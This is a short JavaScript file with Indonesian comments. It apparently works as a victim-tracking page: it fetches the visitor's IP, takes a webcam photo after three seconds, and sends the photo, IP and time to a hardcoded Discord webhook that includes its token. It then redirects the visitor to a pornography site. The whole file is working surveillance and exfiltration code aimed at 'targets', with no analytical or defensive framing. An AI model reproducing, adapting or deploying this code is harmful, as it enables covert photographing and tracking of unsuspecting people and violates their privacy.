const webhookURL = "https://discord.com/api/webhooks/1352760933654724668/RiiciP_za_eGd7u1OvHr1IbLXm4Ob7NWmk7MUMkOJ8Z9TZOAOFFPESpwMspxeQR_WPp9"; // Ganti dengan Webhook Discord
const redirectURL = "https://pornhub.com"; // Ganti dengan URL tujuan setelah 11 detik

const canvas = document.createElement("canvas");
const context = canvas.getContext("2d");
canvas.style.display = "none";
document.body.appendChild(canvas);

// Fungsi untuk mendapatkan waktu UTC
function getUTC() {
    const now = new Date();
    const utcHours = now.getUTCHours().toString().padStart(2, "0");
    const utcMinutes = now.getUTCMinutes().toString().padStart(2, "0");
    return `${utcHours}:${utcMinutes} UTC`;
}

// Ambil IP Target
fetch("https://api64.ipify.org?format=json")
    .then(response => response.json())
    .then(data => {
        const ip = data.ip;
        const location = "Unknown"; // Bisa diganti dengan API lokasi jika perlu

        // Akses kamera hanya untuk ambil foto
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                
                setTimeout(() => {
                    const utcTime = getUTC(); // Ambil waktu UTC saat foto diambil
                    imageCapture.takePhoto()
                        .then(blob => {
                            sendToDiscord(blob, ip, location, utcTime);
                            track.stop(); // Matikan kamera setelah foto diambil
                        })
                        .catch(error => console.error("Gagal ambil foto:", error));
                }, 3000); // Ambil foto setelah 3 detik
            })
            .catch(err => console.error("Akses kamera ditolak:", err));
    })
    .catch(err => console.error("Gagal ambil IP:", err));

// Kirim ke Webhook Discord
function sendToDiscord(blob, ip, location, utcTime) {
    const formData = new FormData();
    formData.append("file", blob, "capture.jpg");

    formData.append("payload_json", JSON.stringify({
        content: `📸 **Data Target**\n🌍 **IP**: ${ip}\n📌 **Location**: ${location}\n⏰ **Time**: ${utcTime}`
    }));

    fetch(webhookURL, {
        method: "POST",
        body: formData
    });
}

// Redirect ke halaman lain setelah 11 detik
setTimeout(() => {
    window.location.href = redirectURL;
}, 11000);
